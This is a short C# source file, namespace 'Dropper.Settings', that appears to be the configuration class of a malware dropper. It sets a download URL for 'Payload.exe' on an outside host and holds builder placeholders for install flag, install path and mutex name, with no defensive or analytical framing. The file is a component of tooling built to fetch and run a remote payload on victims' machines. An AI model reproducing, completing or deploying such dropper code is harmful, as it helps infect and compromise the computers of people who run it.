using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Dropper.Settings
{
    public class Download
    {
        public static string DownloadURL = "http://bunnybutt.lol/files/Payload.exe";
    }
    public class Dropper
    {
        public static string Install = "%install%";
        public static string InstallPath = @"%path%";
        public static string Mutex = "%mutex%";
    }
}